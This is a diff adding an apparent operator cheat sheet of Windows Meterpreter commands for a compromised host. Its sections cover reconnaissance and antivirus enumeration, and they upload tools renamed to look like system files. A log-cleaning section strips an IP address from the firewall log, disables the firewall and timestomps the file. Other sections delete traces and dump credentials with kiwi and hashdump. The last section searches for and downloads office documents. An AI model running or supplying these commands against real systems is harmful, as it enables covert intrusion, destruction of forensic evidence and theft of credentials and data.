@@ -1,0 +1,231 @@
+####### Windown Meterpreter Commands #######
+
+####### Survey #######
+X-----------------------------
+localtime
+getpid
+getuid
+sysinfo
+run multicommand -cl "systeminfo"
+
+ipconfig
+run multicommand -cl "cmd /c ipconfig /all"
+ps
+
+upload "/tools/utilities/sysinternals/psloglist.exe" "c:/windows/temp/wsupdt.exe"
+cd c:\windows\\temp
+run multicommand -cl "cmd /c wsupdt.exe -h /accepteula"
+run multicommand -cl "cmd /c wsupdt.exe -m 10 security"
+run multicommand -cl "cmd /c wsupdt.exe -m 10 application"
+run multicommand -cl "cmd /c wsupdt.exe -m 10 system"
+
+run event_manager -i
+run event_manager -l "Windows PowerShell"
+
+upload "/tools/utilities/sysinternals/Listdlls.exe" "c:/windows/temp/sockapi64.exe"
+run multicommand -cl "cmd /c sockapi64.exe -h /accepteula"
+run multicommand -cl "cmd /c sockapi64.exe| findstr \"Command line\""
+
+netstat
+run multicommand -cl "cmd /c netstat -rn"
+run multicommand -cl "cmd /c net share","cmd /c net use"
+run post/multi/gather/env
+run post/windows/gather/enum_applications
+run post/windows/gather/enum_logged_on_users
+idletime
+
+pgrep spoolsv.exe
+migrate <spoolsv.exe>
+
+reg queryval -k 'HKLM\software\wow6432node\policies\microsoft\windows\powershell\modulelogging' -v EnableModuleLogging
+reg queryval -k 'HKLM\software\wow6432node\policies\microsoft\windwws\powershell\scriptblocklogging' -v EnablescriptblockLogging
+reg queryval -k 'HKLM\software\wow6432node\policies\microsoft\windows\powershell\transcription' -v Enabletranscripting
+reg queryval -k 'HKLM\software\wow6432node\policies\microsoft\windows\powershell\transcription' -v outputdirectory
+cat 'powershell transcriptfile'
+
+load powershell
+powershell_execute "gwmi -namespace root\\securitycenter2 -class antivirusproduct"
+OR
+shell
+wmic /node:localhost /namespace:\\root\securitycenter2 path antivirusproduct get displayname /format:list
+
+powershell_execute "Get-wmiobject win32_service | where-object { $_.Startmode -eq 'Auto' } | format-list Name, DisplayName, PathName"
+OR
+run wmic -c "service where (state='running') get name, displayname, path /format:list"
+
+powershell_execute "$tasks = schtasks.exe /query /v /fo csv | convertfrom-csv; $tasks | where-object {$_.'Scheduled Task State' -eq \"Enabled\"} | select-object TaskName, 'Task To Run'"
+OR
+run multicommand -cl "schtasks /query /v /fo list" -f /tmp/schtasks
+
+powershell_execute "gwmi win32_startupcommand | select-object name, command,location, user | format-list"
+OR
+run wmic -c "startup get caption, command"
+
+reg enumkey -k "HKLM\\software"
+reg enumkey -k "HKLM\\software\\wow6432node"
+
+powershell_execute 'get-psdriver -psprovider filesystem'
+OR
+run wmic -c "logicaldisk get deviceid, volumename, description"
+run multicommand -cl "driverquery /v /fo list" -f /tmp/drivers
+
+run multicommand -cl "cmd /c auditpol /get /category:*"
+run multicommand -cl "cmd /c dir c:\\windows\\temp /od /tw"
+
+run multicommand -cl "netsh advfirewall show currentprofile"
+cat c:\\windows\\pfirewall.log
+run multicommand -cl "findstr \"stuff to look for \" c:\\windows\\pfirewall.log"
+
+run multicommand -cl "cmd /c netsh advfirewall firewall show rule name=all status=enabled | findstr LocalPort | findstr /v Any"
+-----------------------------X
+
+
+####### Malware #######
+X-----------------------------
+run wmic -c " process get commandline, processid, parentprocessid /format:list"
+
+powershell_execute "get-child c:\\windows\\system32\\rpcwinsvc.exe | select-object name, creationtime,lastwritetime, lastaccesstime"
+run multicommand -cl "tasklist /m /fi \"pid eq 1111\""
+OR
+run multicommand -cl "cmd /c dir c:\\windows\\system32\\rpcwinsvc.exe"
+run multicommand -cl "cmd /c dir c:\\* /S /A | find \"11/11/2009  04:03\""
+search -f rpcwinsvc.exe
+
+upload "/root/handle64.exe" "c:\\windows\\temp\\netapi32.exe"
+cd c:\\windows\\temp
+run multicommand -cl "cmd /c netapi32.exe -h /accepteula"
+run multicommand -cl "cmd /c netapi32.exe -p 1940"
+
+upload "/root/sigcheck.exe" "c:\\windows\\temp\\netapi16.exe"                                                                                                                                                      
+cd c:\\windows\\temp
+run multicommand -cl "cmd /c netapi16.exe -h /accepteula"
+run multicommand -cl "cmd /c netapi16.exe -u c:\windows\system32\drivers" -f /tmp/drivers
+
+powershell_execute 'driverquery /v /fo csv | convertfrom-csv | select-object "display name", "start mode", "link date", path'
+
+download bad.exe /tmp/bad.exe
+strings
+md5sum
+run process_memdump -p 1940
+-----------------------------X                                                                                                                                                                                     
+
+
+####### ESP #######
+X-----------------------------
+run multicommand -cl 'cmd /c find /i "Engine" c:\windows\temp\mpsigstub.log'
+upload "/root/regfind-win32.exe" "C:/windwos/temp/mslog32.exe
+cd c:\\windows\\temp
+run multicommand -cl 'cmd /c /mslog32.exe -p "HKEY_LOCAL_MACHINE\software\sophos" -n Version
+
+run multicommand -cl 'cmd /c findstr /spin /c:"engine" c:\programdata\sophos\*' -f /tmp/engine
+
+powershell_execute "forEach($Key in gci -path \"hklm:/software/avg\" -recurse) {forEach ($Value in $Key.GetValueNames()) {New-Object PSObject -Property @{Path = $Key.Name; Name = $Value; Value = $Key.GetValue($Value)}}}"
+OR
+run multicommand -cl 'cmd /c reg query hklm\software\sophos /s' -f /tmp/regquery
+
+run multicommand -cl 'cmd /c dir /s /b  "c:\programdata" | findstr /spi "log" | findstr /spi "sophos"
+
+run multicommand -cl 'cmd /c dir /s /b  "c:\programdata" | findstr /spi ".cfg \.ini \.xml .\yml"'
+
+reg enumkey -k "HKLM\\software\\microsoft\\microsoft antimalware"
+reg enumkey -k "HKLM\\software\\microsoft\\windows\\currentversion\\uninstall"
+reg enumkey -k "HKLM\\software\\microsoft\\windows defender"
+reg enumkey -k "HKLM\\software\\kaspersky lab"
+reg enumkey -k "HKLM\\software\\macfee\\system core"
+reg enumkey -k "HKLM\\software\\wow6432node\\avg"
+ls "c:\\programdata\\kaspersky lab"
+ls "c:\\programdata\\mcafee\\mclogs"
+cat "C:\\windows\\temp\\mpcmdrun.log"
+cat "C:\\windows\\temp\\mpsigstub.log"
+ls "%allusersprofile%\\microsoft\\microsoft antimalware"
+
+*****  Security Essentials  *****
+run multicommand -cl "cmd /c wsupdate.exe -i 1000 system"                   #last good scan
+reg enumkey -k "HKLM\\software\\microsoft\\microsoft antimalware\\signatures updates\\avsignatureversion"
+run command -cl 'cmd /c find /i "Engine Version" "c:\users\all users\microsoft\microsoft antimalware\support\mplog-*.log"'
+run command -cl 'cmd /c find /i "Av Signature" "c:\users\all users\microsoft\microsoft antimalware\support\mplog-*.log"'                                                                                         
+run command -cl 'cmd /c find /i "product version" "c:\users\all users\microsoft\microsoft antimalware\support\mplog-*.log"'
+run command -cl 'cmd /c find /i "signature update on" "c:\users\all users\microsoft\microsoft antimalware\support\mplog-*.log"'         
+grep -i -A 10 -B 7 MpCmdRun.exe /tmp/schtasks       # next scan date
+reg enumkey -k "HKLM\\software\\microsoft\\microsoft antimalware\\spynet\sypnetreporting"
+reg enumkey -k "HKLM\\software\\microsoft\\microsoft antimalware\\exclusions\\path"
+
+*****  Baidu  *****
+run command -cl 'cmd /c find /i "Avengineversion" "c:\program files (x86)\\baidu security\\baidu antivirus\config.ini"'                                                                                         
+run command -cl 'cmd /c find /i "avupdatedate" "c:\program files (x86)\\baidu security\\baidu antivirus\config.ini"'                                                                                            
+run command -cl 'cmd /c find /i "avvdfversion" "c:\program files (x86)\\baidu security\\baidu antivirus\config.ini"'                                                                                            
+run command -cl 'cmd /c find /i "autoupload" "c:\program files (x86)\\baidu security\\baidu antivirus\config.ini"'                                                                                            
+run command -cl 'cmd /c find /i "lastscantime" "c:\users\all users\baidu\antivirus\userconfig.ini"'                                                                                            
+
+
+run multicommand -cl "netsh advfirewall firewall show rule name=\"Windows Remote Management (HTTP-In)\""
+run multicommand -cl "netsh advfirewall firewall show rule name=\"Windows Remote Management (HTTPS-In)\""
+-----------------------------X                                                                                                                                                                                     
+
+
+####### Log Cleaning #######
+X-----------------------------
+cat c:\\windows\\system32\\logfiles\\firewall\\firewall.log
+run multicommand -cl "cmd /c findstr /V \"192.168.0.1\" c:\\windows\\system32\\logfiles\\firewall\\firewall.log > c:\\windows\\temp\\sd_120.tmp
+cat c:\\windows\\temp\\sd_120.tmp
+ps                              #check for logon.scr, shutting down firewall will create a popup
+run multicommand -cl "netsh firewall set opmode disable"
+cat c:\\windows\\temp\\sd_120.tmp
+run multicommand -cl "cmd /c copy c:\\windows\\temp\\sd_120.tmp c:\\windows\\system32\\logfiles\\firewall\\firewall.log"
+timestomp -m "03/21/2019 14:23:40" c:\\windows\\system32\\logfiles\\firewall\\firewall.log"
+ls c:\\windows\\system32\\logfiles\\dfirewall.log
+run multicommand -cl "cmd /c dir c:\\windows\\system32\\logfiles\\firewall\\firewall.log"
+run multicommand -cl "netsh firewall set opmode enable"
+
+run multicommand -cl "cmd /c type c:\\windows\\temp\\mpcmdrun.log | findstr infected"
+-----------------------------X                                                                                                                                                                                     
+
+
+####### Exit Off Box #######
+X-----------------------------
+run multicommand -cl "cmd /c dir c:\\*.*wer /S /A /o:d /t:w"
+run multicommand -cl "cmd /c dir c:\\*.*dump /S /A /o:d /t:w"                    
+run multicommand -cl "cmd /c dir c:\\*.*log /S /A /o:d /t:w"
+
+
+run multicommand -cl "cmd /c wsupdt.exe -m 60 security"                                                      
+run multicommand -cl "cmd /c wsupdt.exe -m 60 application"
+run multicommand -cl "cmd /c wsupdt.exe -m 60 system"
+
+rm "c:\\windows\\temp\\sd_120.tmp"
+rm "c:\\windows\\temp\\wsupdt.exe"
+rm "c:\\windows\\temp\\netapi32.exe"
+rm "c:\\windows\\temp\\sockapi32.exe"
+rm "c:\\windows\\temp\\msaud32.exe"
+rm "c:\\windows\\temp\\mslog32.exe"
+
+run multicommand -cl "cmd /c dir c:\\windows\\temp /od /tw" 
+
+run multicommand -cl "cmd /c dir c:\\windows\\prefect /A /o:d /t:w"                                                                                                                                                
+cd 'c:\windows\prefetch'
+rm bad.file
+ls 'c:\windows\prefetch'
+netstat
+ps
+exit
+-----------------------------X                                                                                                                                                                                     
+
+
+#######   Collection   #######
+X-----------------------------
+load extapi
+adsi_nested_group_user_enum barleyhop.lab "CN=Unseen-Faculty, CN=Users,DC=barlyhop,DC=lab"
+adsi_computer_enum barleyhop.lab
+
+load kiwi
+sekurlsa::logonpasswords
+post/windows/gather/smart_hashdump
+
+run multicommand -cl "cmd /c net accounts"
+
+search -f *.doc*
+search -f *.xls*                                                                                                                                                                                                   
+search -f *.ppt*                                                                                                                                                                                                   
+search -f *.pdf
+download 'c:\...' /tmp                                                                                                                                                                                           
+-----------------------------X
